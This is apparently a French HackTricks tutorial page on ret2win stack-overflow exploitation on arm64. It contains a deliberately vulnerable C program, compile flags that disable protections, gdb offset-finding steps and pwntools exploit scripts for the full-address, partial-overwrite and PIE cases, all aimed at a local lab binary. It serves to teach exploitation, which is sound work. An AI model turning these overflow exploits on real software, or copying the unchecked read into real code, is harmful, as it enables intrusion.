# Ret2win - arm64

{{#include ../../../banners/hacktricks-training.md}}

Trouvez une introduction à arm64 dans :

{{#ref}}
../../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

## Code
```c
#include <stdio.h>
#include <unistd.h>

void win() {
printf("Congratulations!\n");
}

void vulnerable_function() {
char buffer[64];
read(STDIN_FILENO, buffer, 256); // <-- bof vulnerability
}

int main() {
vulnerable_function();
return 0;
}
```
Compiler sans pie et canary :
```bash
clang -o ret2win ret2win.c -fno-stack-protector -Wno-format-security -no-pie
```
## Trouver le décalage

### Option de motif

Cet exemple a été créé en utilisant [**GEF**](https://github.com/bata24/gef) :

Démarrez gdb avec gef, créez un motif et utilisez-le :
```bash
gdb -q ./ret2win
pattern create 200
run
```
<figure><img src="../../../images/image (1205).png" alt=""><figcaption></figcaption></figure>

arm64 essaiera de retourner à l'adresse dans le registre x30 (qui a été compromis), nous pouvons utiliser cela pour trouver le décalage du motif :
```bash
pattern search $x30
```
<figure><img src="../../../images/image (1206).png" alt=""><figcaption></figcaption></figure>

**Le décalage est de 72 (9x48).**

### Option de décalage de la pile

Commencez par obtenir l'adresse de la pile où le registre pc est stocké :
```bash
gdb -q ./ret2win
b *vulnerable_function + 0xc
run
info frame
```
<figure><img src="../../../images/image (1207).png" alt=""><figcaption></figcaption></figure>

Maintenant, définissez un point d'arrêt après le `read()` et continuez jusqu'à ce que le `read()` soit exécuté et définissez un motif tel que 13371337 :
```
b *vulnerable_function+28
c
```
<figure><img src="../../../images/image (1208).png" alt=""><figcaption></figcaption></figure>

Trouvez où ce motif est stocké en mémoire :

<figure><img src="../../../images/image (1209).png" alt=""><figcaption></figcaption></figure>

Ensuite : **`0xfffffffff148 - 0xfffffffff100 = 0x48 = 72`**

<figure><img src="../../../images/image (1210).png" alt="" width="339"><figcaption></figcaption></figure>

## Pas de PIE

### Régulier

Obtenez l'adresse de la fonction **`win`** :
```bash
objdump -d ret2win | grep win
ret2win:     file format elf64-littleaarch64
00000000004006c4 <win>:
```
Exploitation :
```python
from pwn import *

# Configuration
binary_name = './ret2win'
p = process(binary_name)

# Prepare the payload
offset = 72
ret2win_addr = p64(0x00000000004006c4)
payload = b'A' * offset + ret2win_addr

# Send the payload
p.send(payload)

# Check response
print(p.recvline())
p.close()
```
<figure><img src="../../../images/image (1211).png" alt="" width="375"><figcaption></figcaption></figure>

### Off-by-1

En fait, cela va plutôt ressembler à un off-by-2 dans le PC stocké dans la pile. Au lieu d'écraser toute l'adresse de retour, nous allons écraser **uniquement les 2 derniers octets** avec `0x06c4`.
```python
from pwn import *

# Configuration
binary_name = './ret2win'
p = process(binary_name)

# Prepare the payload
offset = 72
ret2win_addr = p16(0x06c4)
payload = b'A' * offset + ret2win_addr

# Send the payload
p.send(payload)

# Check response
print(p.recvline())
p.close()
```
<figure><img src="../../../images/image (1212).png" alt="" width="375"><figcaption></figcaption></figure>

Vous pouvez trouver un autre exemple off-by-one en ARM64 dans [https://8ksec.io/arm64-reversing-and-exploitation-part-9-exploiting-an-off-by-one-overflow-vulnerability/](https://8ksec.io/arm64-reversing-and-exploitation-part-9-exploiting-an-off-by-one-overflow-vulnerability/), qui est un véritable off-by-**one** dans une vulnérabilité fictive.

## Avec PIE

> [!TIP]
> Compilez le binaire **sans l'argument `-no-pie`**

### Off-by-2

Sans un leak, nous ne connaissons pas l'adresse exacte de la fonction gagnante, mais nous pouvons connaître le décalage de la fonction par rapport au binaire et sachant que l'adresse de retour que nous écrasons pointe déjà vers une adresse proche, il est possible de leak le décalage vers la fonction win (**0x7d4**) dans ce cas et d'utiliser simplement ce décalage :

<figure><img src="../../../images/image (1213).png" alt="" width="563"><figcaption></figcaption></figure>
```python
from pwn import *

# Configuration
binary_name = './ret2win'
p = process(binary_name)

# Prepare the payload
offset = 72
ret2win_addr = p16(0x07d4)
payload = b'A' * offset + ret2win_addr

# Send the payload
p.send(payload)

# Check response
print(p.recvline())
p.close()
```
{{#include ../../../banners/hacktricks-training.md}}
